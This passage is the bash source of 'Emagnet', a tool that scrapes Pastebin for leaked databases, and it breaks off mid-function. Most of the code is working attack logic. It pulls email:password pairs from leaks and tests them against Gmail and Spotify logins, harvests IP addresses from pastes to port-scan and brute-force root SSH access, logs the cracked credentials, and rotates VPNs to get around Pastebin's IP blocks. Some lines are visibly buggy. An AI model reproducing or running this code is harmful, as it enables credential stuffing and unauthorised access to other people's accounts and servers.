#!/bin/bash
################################################################################
################################################################################
####                                                                       #####
#### A notice to all nerds.                                                #####
#### If you will copy developers real work it will not make you a hacker.  #####
#### Resepect all developers, we doing this because it's fun!              #####
####                                                                       #####
################################################################################
################################ SOURCE CODE ###################################
################################################################################
###################### EMAGNET WAS FOUNDED BY WUSEMAN ##########################
################################################################################
####                                                                       #####
####  Emagnet - A tool for find all latest leaked databases                #####
####  Copyright (C) 2018-2019, wuseman                                     #####
####                                                                       #####
####  This program is free software; you can redistribute it and/or modify #####
####  it under the terms of the GNU General Public License as published by #####
####  the Free Software Foundation; either version 2 of the License, or    #####
####  (at your option) any later version.                                  #####
####                                                                       #####
####  This program is distributed in the hope that it will be useful,      #####
####  but WITHOUT ANY WARRANTY; without even the implied warranty of       #####
####  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #####
####  GNU General Public License for more details.                         #####
####                                                                       #####
####  You must obey the GNU General Public License. If you will modify     #####
####  emagnet file(s), you may extend this exception to your version       #####
####  of the file(s), but you are not obligated to do so.  If you do not   #####
####  wish to do so, delete this exception statement from your version.    #####
####  If you delete this exception statement from all source files in the  #####
####  program, then also delete it here.                                   #####
####                                                                       #####
####  Contact:                                                             #####
####          IRC: Freenode @ wuseman                                      #####
####          Mail: wuseman <wuseman@nr1.nu>                               #####
####                                                                       #####
################################################################################
######## The Nr1 tool for find latest leaked databases online @ 2o18 ###########
################################################################################

banner() {
cat << "EOF"
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'

EOF
printf "%64s \n\n" | tr ' ' '='
}

( hash curl &> /dev/null; [[ $? -ne "0" ]] && echo -e "$basename: internal error -- curl is required to be installed."; exit 1 )

usage() {
cat << "EOF"

Usage: ./emagnet [--author] [--emagnet] [--option] .....

  -a, --author        Show author information.
  -l, --license       Show license information.
  -h, --help          Display this very helpful text
  -n, --notify        Set notifications on or off
  -t, --time          Set refresh time
  -v, --vpn           Toggle VPN on or off (true/false)
  -V, --version       Displays version information.

  -b, --backup        Create a compressed archive
  -e, --emagnet       Download latest uploads and store leaked dbs
  -g, --bruteforce    Same as '-e' with brute-force mode on
                      Available options: SPOTIFY/SSH/GMAIL
  -i, --ip            Print you current WAN IPv4/IPv6
  -k, --kill          Kill emagnet sessions
  -q, --quiet         Run in screen
  -x, --syntax        Download uploads sorted by syntax

EOF
}

mustberoot() {
(( ${EUID} > 0 )) && \
printf "%s\n" "$basename$0: internal error -- root privileges is required" && \
exit 1;  }

conf() {
  CONF="/etc/emagnet.conf"
. "$CONF" ;}

if ! [[ -f "/etc/emagnet.conf" ]]; then
    cp "./emagnet.conf" "/etc/"
fi

mustbefilled() {
  if [[ -z "$DEBUG"          ]];   then sed -i "12d"  "$CONF";sed -i '12  i DEBUG=false'                                                                                                             "$CONF";fi
  if [[ -z "$PASTEBIN"       ]];   then sed -i '21d'  "$CONF";sed -i '21  i PASTEBIN=https:\/\/www.pastebin.com'                                                                            "$CONF";fi
  if [[ -z "$WIP"            ]];   then sed -i '50d'  "$CONF";sed -i '50  i WIP=https:\/\/nr1.nu\/i\/'                                                                                               "$CONF";fi
  if [[ -z "$WIP2"           ]];   then sed -i '51d'  "$CONF";sed -i '51  i WIP2='                                                                                                                   "$CONF";fi
  if [[ -z "$WIP3"           ]];   then sed -i '52d'  "$CONF";sed -i '52  i WIP3='                                                                                                                   "$CONF";fi
  if [[ -z "$WIP4"           ]];   then sed -i '53d'  "$CONF";sed -i '53  i WIP4='                                                                                                                   "$CONF";fi
  if [[ -z "$MYIP"           ]];   then sed -i '40d'  "$CONF";sed -i "40  i MYIP=$(curl -s https://nr1.nu/i/)"                                                                                         "$CONF";fi
  if [[ -z "$MYIP"           ]];   then sed -i '30d'  "$CONF";sed -i "30  i TIME=150"                                                                                                                "$CONF";fi
  if [[ -z "$EMAGNET"        ]];   then sed -i '72d'  "$CONF";sed -i '72  i EMAGNET=/opt/emagnet'                                                                                                    "$CONF";fi
  if [[ -z "$EMAGNETHOME"    ]];   then sed -i "73d"  "$CONF";sed -i '73  i EMAGNETHOME=$EMAGNET\/incoming\/$(date +%Y-%m-%d)'                                                                       "$CONF";fi
  if [[ -z "$EMAGNETLOGS"    ]];   then sed -i "74d"  "$CONF";sed -i '74  i EMAGNETLOGS=$EMAGNETHOME/logs'                                                                                           "$CONF";fi
  if [[ -z "$EMAGNETPW"      ]];   then sed -i "75d"  "$CONF";sed -i '75  i EMAGNETPW=$EMAGNETHOME\/password-files'                                                                                  "$CONF";fi
  if [[ -z "$EMAGNETALL"     ]];   then sed -i "76d"  "$CONF";sed -i '76  i EMAGNETALL=$EMAGNETHOME\/all-files'                                                                                      "$CONF";fi
  if [[ -z "$EMAGNETCRAP"    ]];   then sed -i "77d"  "$CONF";sed -i '77  i EMAGNETCRAP=$EMAGNETHOME\/.pastebin'                                                                                     "$CONF";fi
  if [[ -z "$EMAGNETTEMP"    ]];   then sed -i "78d"  "$CONF";sed -i '78  i EMAGNETTEMP=$EMAGNETHOME\/.temp'                                                                                         "$CONF";fi
  if [[ -z "$EMAGNETARCHIVE" ]];   then sed -i "79d"  "$CONF";sed -i '79  i EMAGNETARCHIVE=$EMAGNET/archive'                                                                                         "$CONF";fi
  if [[ -z "$EMAGNETDB"      ]];   then sed -i "80d"  "$CONF";sed -i '80  i EMAGNETDB=$EMAGNETHOME\/email-files'                                                                                     "$CONF";fi
  if [[ -z "$EMAGNETBACKUP"  ]];   then sed -i "81d"  "$CONF";sed -i '81  i EMAGNETBACKUP=$EMAGNET/backup'                                                                                           "$CONF";fi
  if [[ -z "$EMAGNETSYNTAX"  ]];   then sed -i "82d"  "$CONF";sed -i '82  i EMAGNETSYNTAX=$EMAGNETHOME\/sorted-by-syntax'                                                                            "$CONF";fi
  if [[ -z "$VERSION"        ]];   then sed -i '91d'  "$CONF";sed -i '91  i VERSION=3.4'                                                                                                             "$CONF";fi
  if [[ -z "$THREADS"        ]];   then sed -i '100d' "$CONF";sed -i "100 i THREADS=$(( NUMCPUS + 1 ))"                                                                                              "$CONF";fi
  if [[ -z "$IDLETIME"       ]];   then sed -i '109d' "$CONF";sed -i "109 i IDLETIME=3600"                                                                                                           "$CONF";fi
  if [[ -z "$GBRUTEFORCE"    ]];   then sed -i '118d' "$CONF";sed -i '118 i GBRUTEFORCE=false'                                                                                                       "$CONF";fi
  if [[ -z "$SBRUTEFORCE"    ]];   then sed -i '119d' "$CONF";sed -i '119 i SBRUTEFORCE=false'                                                                                                       "$CONF";fi
  if [[ -z "$PBRUTEFORCE"    ]];   then sed -i '120d' "$CONF";sed -i '120 i PBRUTEFORCE=false'                                                                                                       "$CONF";fi
  if [[ -z "$EMAIL2SEND"     ]];   then sed -i '129d' "$CONF";sed -i '129 i EMAIL2SEND='                                                                                                             "$CONF";fi
  if [[ -z "$NOTIFY"         ]];   then sed -i '138d' "$CONF";sed -i '138 i NOTIFY=false'                                                                                                            "$CONF";fi
  if [[ -z "$SSHUSER"        ]];   then sed -i '169d' "$CONF";sed -i '169 i SSHUSER="root"'                                                                                                          "$CONF";fi
  if [[ -z "$SSHPORT"        ]];   then sed -i '170d' "$CONF";sed -i '170 i SSHPORT="22"'                                                                                                            "$CONF";fi
  if [[ -z "$SSHPASS"        ]];   then sed -i '171d' "$CONF";sed -i '171 i SSHPASS='                                                                                                              "$CONF";fi
  if [[ -z "$SSHTARGETS"     ]];   then sed -i '172d' "$CONF";sed -i '172 i SSHTARGETS="/tmp/.emagnet-sshbruter.txt"'                                                                                "$CONF";fi
  if [[ -z "$SSHPORTSCAN"    ]];   then sed -i '173d' "$CONF";sed -i '173 i SSHPORTSCAN="/tmp/.emagnet-portscan"'                                                                                    "$CONF";fi
  if [[ -z "$VPN"            ]];   then sed -i '150d' "$CONF";sed -i '150 i VPN=false'                                                                                                               "$CONF";fi
  if [[ -z "$VPNROOT"        ]];   then sed -i '151d' "$CONF";sed -i '151 i VPNROOT=/etc/openvpn'                                                                                                    "$CONF";fi
  if [[ -z "$VPNPROVIDER"    ]];   then sed -i '152d' "$CONF";sed -i '152 i VPNPROVIDER=$VPNROOT/'                                                                                                   "$CONF";fi
  if [[ -z "$VPNPROVIDER2"   ]];   then sed -i '153d' "$CONF";sed -i '153 i VPNPROVIDER2=$VPNROOT/'                                                                                                  "$CONF";fi
  if [[ -z "$VPNPROVIDER3"   ]];   then sed -i '154d' "$CONF";sed -i '154 i VPNPROVIDER3=$VPNROOT/'                                                                                                  "$CONF";fi
  if [[ -z "$VPNCOUNTRYS"    ]];   then sed -i '155d' "$CONF";sed -i '155 i VPNCOUNTRYS="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'   "$CONF";fi
  if [[ -z "$VPNCOUNTRYS2"   ]];   then sed -i '156d' "$CONF";sed -i '156 i VPNCOUNTRYS2="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'  "$CONF";fi
  if [[ -z "$VPNCOUNTRYS3"   ]];   then sed -i '157d' "$CONF";sed -i '157 i VPNCOUNTRYS3="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'  "$CONF";fi
  if [[ -z "$USERAGENT"      ]];   then sed -i '183d' "$CONF";sed -i '183 i USERAGENT=Mosaic/0.9'                                                                                                    "$CONF";fi
}

paths() {
  if [[ ! -d "$EMAGNETHOME"    ]];    then mkdir -p "$EMAGNETHOME"     &> /dev/null;  fi
  if [[ ! -d "$EMAGNETDB"      ]];    then mkdir -p "$EMAGNETDB"       &> /dev/null;  fi
  if [[ ! -d "$EMAGNETPW"      ]];    then mkdir -p "$EMAGNETPW"       &> /dev/null;  fi
  if [[ ! -d "$EMAGNETTEMP"    ]];    then mkdir -p "$EMAGNETTEMP"     &> /dev/null;  fi
  if [[ ! -d "$EMAGNETCRAP"    ]];    then mkdir -p "$EMAGNETCRAP"     &> /dev/null;  fi
  if [[ ! -d "$EMAGNETALL"     ]];    then mkdir -p "$EMAGNETALL"      &> /dev/null;  fi
  if [[ ! -d "$EMAGNETARCHIVE" ]];    then mkdir -p "$EMAGNETARCHIVE"  &> /dev/null;  fi
  if [[ ! -d "$EMAGNETLOGS"    ]];    then mkdir -p "$EMAGNETLOGS"     &> /dev/null;  fi
}

author() {
cat << "EOF"

 Copyright (C) 2018-2019, wuseman

 Emagnet was founded in 2015 and was released as open source
 on github.com/wuseman/emagnet in January 2018 and is licensed
 under GNU LESSER GENERAL PUBLIC LICENSE GPLv3

   - Author: wuseman <wuseman@nr1.nu>
   - IRC   : wuseman <irc.freenode.com>

 Please report bugs/issues on:

   - https://github.com/wuseman/EMAGNET/issues

EOF
}

colors() {
  R="$(tput setaf 1)" # RED
  G="$(tput setaf 2)" # GREEN
  Y="$(tput setaf 3)" # YELLOW
  B="$(tput setaf 4)" # BLUE
  M="$(tput setaf 5)" # MAGENTA
  C="$(tput setaf 6)" # CYAN
  W="$(tput setaf 7)" # WHITE
  E="$(tput sgr0)"    # END OF COLOR
}

iconnection() {
ping -i "0.2" -c 1 1.1.1.1 &> /dev/null
if [[ "$?" -gt "0" ]]; then
     echo -e "This feature require a internet connection and you are offline..\nPlease fix your internet connection and try again..\n"
     exit
fi
}

if [[ ! -f "$CONF" ]]; then
       mustberoot
       colors
       conf
       mustbefilled
       paths
       timeout 2 ping -t 1 -c 1 nr1.nu &> /dev/null
      [[ "$?" -gt "0" ]] && sed -i 's/MYIP=/MYIP=127.0.0.1/g' ./emagnet.conf || wip
       conf
fi

noticeaboutscraping() {
   clear
   banner
   echo -e "                            \e[1;31mNOTICE\e[0m:\n"
   echo -e "[\e[1;31m<<\e[0m] - You are scraping pastbin.com way too fast! \e[1;31mSlow Down\e[0m!"
   echo -e "[\e[1;31m<<\e[0m] - Pastebin has blocked you from the archive page until you slow down."
   echo -e "[\e[1;31m<<\e[0m] - You will only be able to download 8 files at time until you raise TIME"
   echo -e "[\e[1;31m<<\e[0m] - The block from pastebin.com/archive will be lifted within 20 minutes.."
   sleep 7
   clear
   banner
 }

heavyload() {
			if [[ -z "$USERAGENT" ]]; then
				echo -e "$basename$0: internal errror -- you must set a useragent in $CONF"
				exit
         	fi
curl -sL "$PASTEBIN" -H "$USERAGENT" \
|grep -q "is under heavy load right now"
  if [[ "$?" = "0" ]]; then
   for (( ; ; )); do
   wait_time=60
   temp_cnt="${wait_time}"
     while [[ "${temp_cnt}" -gt 0 ]]; do
        printf "\rPastebin is currently under heavy load, let's wait: \e[1;1m%1d\e[0m" ${temp_cnt}
        printf " seconds"
        sleep 1
        ((temp_cnt--))
    done
        echo
        bash "$basename$0" --emagnet
    done
        bash "$basename$0" --emagnet
  fi
}

Iwasbanned() {
. "$CONF"
if [[ -z "$USERAGENT" ]]; then
	echo -e "$basename$0: internal errror -- you must set a useragent in $CONF"
	exit
fi

curl -sL "$PASTEBIN" -H "$USERAGENT"| grep -q "blocked your IP"
if [[ $? = "0" ]]; then
  if [[ $VPN = "false" ]]; then
   for (( ; ; )); do
      wait_time=${IDLETIME}
      temp_cnt=${wait_time}
   while [[ ${temp_cnt} -gt 0 ]]; do
      printf "\rIP: [\e[1;31m$(curl -s $WIP)\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
      printf " seconds"
      sleep 1
      ((temp_cnt--))
   done
        printf "\n"
        clear
        banner
        bash "$basename$0" --emagnet
        sleep 2
   done
        clear
        banner
        bash "$basename$0" --emagnet
       exit
   else
       banned
  fi
fi
}

vpnsetup() {
( hash openvn &> /dev/null; [[ $? -ne "0" ]] && echo -e "$basename$0: internal error -- openvpn is required to be installed when enabling vpn"; exit )
VPNCONFIG=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF|cut -d'"' -f1|head -2|sed '1d')
VPNCONFIG2=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF|cut -d'"' -f1|head -2|tail -1)
VPNCONFIG3=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF|cut -d'"' -f1|head -3|tail -1)

case $COUNTRY in
   belgium)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.be.ovpn"      &> /dev/null & ;;
   bulgaria)       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.bg.ovpn"      &> /dev/null & ;;
   czech)          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.cz.ovpn"      &> /dev/null & ;;
   denmark)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.dk.ovpn"      &> /dev/null & ;;
   spain)          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.es.ovpn"      &> /dev/null & ;;
   finland)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.fi.ovpn"      &> /dev/null & ;;
   united-kingdom) cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.gb.ovpn"      &> /dev/null & ;;
   greece)         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.gr.ovpn"      &> /dev/null & ;;
   hongkong)       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.hk.ovpn"      &> /dev/null & ;;
   hungaria)       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.hu.ovpn"      &> /dev/null & ;;
   italy)          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.it.ovpn"      &> /dev/null & ;;
   moldavia)       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.md.ovpn"      &> /dev/null & ;;
   netherlands)    cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.nl.ovpn"      &> /dev/null & ;;
   norway)         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.no.ovpn"      &> /dev/null & ;;
   poland)         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.pl.ovpn"      &> /dev/null & ;;
   portugal)       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.pt.ovpn"      &> /dev/null & ;;
   romania)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.ro.ovpn"      &> /dev/null & ;;
   russia)         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.rs.ovpn"      &> /dev/null & ;;
   sweden)         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se.ovpn"      &> /dev/null & ;;
   sweden1)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-got.ovpn"  &> /dev/null & ;;
   sweden2)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-hel.ovpn"  &> /dev/null & ;;
   sweden3)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-mma.ovpn"  &> /dev/null & ;;
   sweden4)        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se-sto.ovpn"  &> /dev/null & ;;
   united-states)  cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.us.ovpn"      &> /dev/null & ;;
esac
}


banned() {
if [[ "$VPN" = "false" ]]; then
   Iwasbanned
else

line='...........................................................'
line1='................................[ ok ]'
line2='...............................................'
OPENVPNRUNNING="$(ps aux |grep openvpn|sed '1d')"
MYIP="$(curl -s https://nr1.nu/i/)"
MYCOUNTRY="$(curl -s https://nr1.nu/i/|xargs whois|grep -i COUNTRY|awk '{print tolower($2)}')"
COUNTRY=$(awk -F'="' '/VPNCOUNTRYS="/ {print $2}' $CONF|sed 's/"//g'|tr ' ' '\n'|shuf -n1)

curl -s "$WIP" > "/tmp/.emagnet-ip"
if [[ -n "$OPENVPNRUNNING" ]]; then 
  pkill -9 openvpn
fi

printf "\e[1;31m                You have been blocked by pastebin...\n\n\e[0m"
printf "%s${line2:${#MYIP}}[ ok ]\n" "Current IP: $MYIP"
printf "Connecting to "
printf "\e[1m%s\e[0m%s \e[1;37m%s\e[0m" $COUNTRY ", please wait${line1:${#COUNTRY}}"
printf "\n"
       vpnsetup
       sleep 10
MYIP="$(curl -s https://nr1.nu/i/)"
MYOLDIP="$(cat /tmp/.emagnet-ip)"
    if [[ "$MYIP" != "$MYOLDIP" ]]; then
         MYNEWIP=$(printf "Successfully connected to $(echo  "$(curl -s https://nr1.nu/i/)")")
         printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
         printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
         sleep 5
    fi

     if [[ "$MYIP" = "$MYOLDIP" ]]; then
         echo -e "Still trying to establish a connection.....................[\e[1;3m\e[5mwait\e[0m\e[0m]"
         sleep 10
          if [[ ! $MYIP = "$MYOLDIP" ]]; then
             MYNEWIP=$(echo -e "Successfully connected to $(curl -s https://nr1.nu/i/)")
             printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
             printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
             sleep 5
          else
             echo -e "It seems to be some trouble with the connection, aborted...[\e[1;31mfail\e[0m]\n"
             exit 1
          fi
     fi
fi
}

analyz() {
    text="Analyzing..."
    delay="0.1"
     printf "%26s"; for i in $(seq 0 $(expr length "${text}"));do echo -n "${text:$i:1}"; sleep ${delay};done
}

analyzer() {
wait_time=$TIME
temp_cnt=${wait_time}
  while [[ ${temp_cnt} -gt 0 ]]; do
     printf "\r         I'll Will Find You <-%2d -> It's A Matter Of Time" ${temp_cnt}
     sleep 1
  ((temp_cnt--))
  done
}

countdown() {
    conf
if [[ ${GBRUTEFORCE} = "true" ]]; then
      sed -i '118d' "$CONF"
      sed -i '118 i GBRUTEFORCE=true' "$CONF"
      sed -i '119d' "$CONF"
      sed -i '119 i SBRUTEFORCE=false' "$CONF"
      sed -i '120d' "$CONF"
      sed -i '120 i PBRUTEFORCE=false' "$CONF"
      conf
      printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
      printf "\n%64s \n" | tr ' ' '='
      echo
      analyzer
elif [[ ${PBRUTEFORCE} = "true" ]]; then
      sed -i '118d' "$CONF"
      sed -i '118 i GBRUTEFORCE=false' "$CONF"
      sed -i '119d' "$CONF"
      sed -i '119 i SBRUTEFORCE=false' "$CONF"
      sed -i '120d' "$CONF"
      sed -i '120 i PBRUTEFORCE=true' "$CONF"
      conf
      printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
      printf "\n%64s \n" | tr ' ' '='
      echo
      analyzer
elif [[ ${SBRUTEFORCE} = "true" ]]; then
      sed -i '118d' "$CONF"
      sed -i '118 i GBRUTEFORCE=false' "$CONF"
      sed -i '119d' "$CONF"
      sed -i '119 i SBRUTEFORCE=true' "$CONF"
      sed -i '120d' "$CONF"
      sed -i '120 i PBRUTEFORCE=false' "$CONF"
      conf
      printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
      printf "\n%64s \n" | tr ' ' '='
      echo
      analyzer
else
      sed -i '118d' "$CONF"
      sed -i '118 i GBRUTEFORCE=false' "$CONF"	
      sed -i '119d' "$CONF"
      sed -i '119 i SBRUTEFORCE=false' "$CONF"
      sed -i '120d' "$CONF"
      sed -i '120 i PBRUTEFORCE=false' "$CONF"
      conf
      analyzer
fi
}

blocked() { 
	conf
	if [[ -z "$USERAGENT" ]]; then
		echo -e "$basename$0: internal errror -- you must set a useragent in $CONF"
		exit
	fi
		if [[ ! -s "/tmp/.emagnet" ]]; then 
		curl -h "$HEADER"-Ls "$PASTEBIN" -H "$USERAGENT" > /tmp/.emagnet
fi; 
}

spotifybruter() {
VERSION="0.6.0"
WWWSOURCE="https://nr1.nu/archive/sconsify"
SCONSIFY="${WWWSOURCE}/linux-x86_64-sconsify-${VERSION}.next.zip"
SPOTIFY_TARGETS="/tmp/.emagnet-passwords"
grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
|awk '{print $1}' \
|cut -d':' -f2,3 \
|cut -d'|' -f1 \
|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> /tmp/.emagnet-passwords.txt

while read line; do
SPOTIFY_USER="$(echo $line|cut -d: -f1)"
SPOTIFY_PASS="$(echo $line|cut -d: -f2)"

     ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
          if [[ "$?" -eq "0" ]]; then
             echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
          else
              echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
              echo -e "================================================================"     >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"  >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              echo -e "[+]------------------------------------------------------------"      >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              echo -e "[+] Username: ${SPOTIFY_USER}"                                        >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              echo -e "[+] Password: ${SPOTIFY_PASS}"                                        >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              echo -e "================================================================\n\n" >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
          fi

done < /tmp/.emagnet-passwords.txt
}

sshbruter() {
  hash parallel &> /dev/null
( [[ "$?" -ne "0" ]] && echo -e "$basename$0: internal error -- parallel package is required to be installed.."; exit 1 )
if [[ -z "$SSHPASS" ]]; then
   echo -e "You must set a password to use during the attack"
   read -p "Enter a password or hit enter for default (Default: root) " sshpassb
   echo
       if [[ -n "$sshpassb" ]]; then
       sed -i '170d' z
       sed -i "170 i SSHPASS=$sshpassb" "$CONF"
     else
       sed -i '170d' "$CONF"
       sed -i "170 i SSHPASS=root" "$CONF"
     fi
fi

SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.*\|^11.*"
grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $EMAGNETHOME/.temp\
|awk -F':' '{print $2}'\
|sort\
|grep -v $SKIPLIST\
|awk -F, '!seen[$1]++'> $SSHPORTSCAN
if [[ $(cat /tmp/.emagnet-portscan|wc -l) -eq "0" ]]; then
    printf "%17s[\e[1;31m\e[5m00\e[0m\e[0m] - Ipv4 Addresses found\n"
    sleep 2
else
    clear
    banner
      echo -e "                  PORTSCANNING - BRUTEFORCING"
      printf "\n%64s" | tr ' ' '='
      printf "\nPort/Brute attack will be started within 2 seconds..............\n"
      printf "Please use (CTRL+C) to abort the scan at anytime................\n"
      printf "%64s\n" | tr ' ' '='
    sleep 2
parallel -j$THREADS -a /tmp/.emagnet-portscan '\
timeout 0.5 nc -n -zv {} 22 > /dev/null 2>&1 |tee /tmp/.emagnet-sshbruter.txt 2>&1 grep open && \
timeout 1 sshpass -p "$SSHPASS" ssh -v "-o StrictHostKeyChecking=no" $SSHUSER@{} pwd 2>&1 grep "Authenticated to" &> /dev/null

if [[ $? -eq "0" ]]; then
    echo -e "[\e[1;32m>>\e[0m] - Found password: root@{}"
    echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    echo -e "[+] Login Details For SSH - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"      >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    echo -e "[+] Username: $SSHUSER"                                               >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    echo -e "[+] Password: $SSHPASS"                                               >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
lse
    echo -e "[\e[1;31m<<\e[0m] - Wrong password: root@{}"
    echo -e "[\e[\e[1;31m<<\e[0m] - failed to crack $SSHUSER:$SSHPASS access on: {}:22" >> $EMAGNETLOGS/failed-2-crack.txt
fi
#echo -e "[\e[1;32mopen..\e[0m] - {}:22" || \
#echo -e "[\e[1;31mclosed\e[0m] - {}:22"' 
fi
    rm "$SSHPORTSCAN" "$SSHTARGETS" "grep" "open" &> /dev/null
    sleep 4
}

bruter() {
if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> /tmp/.emagnet-passwords.txt 

while read -r line; do
attack=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o xml)
mail="$(echo $line | cut -d: -f1)"
password="$(echo $line | cut -d: -f2)"
if [[ -z "$attack" ]]; then
    printf "[-] Wrong Password For $mail: \e[1;31m$password\e[0m\n"
    echo -e "[-] $(date +%d/%m/%Y\ -\ %H:%M) -> Wrong Password For $mail $mail: \e[1;31m$password\e[0m" >> $EMAGNETLOGS/failed-to-crack.txt
fi
if [[ -n "$attack" ]]; then
    echo -e "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
    read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
    echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
    echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
    echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
    echo -e "[+] Username: $mail"                                                  >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
    echo -e "[+] Password: $password"                                              >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
    echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
fi
done < /tmp/.emagnet-passwords.txt
    rm /tmp/.emagnet-passwords.txt
    sleep 3
else
    sleep 1
fi
}

emagnetsyntax() {
		if [[ -z $USERAGENT ]]; then
			echo -e "$basename$0: internal errror -- you must set a useragent in $CONF"
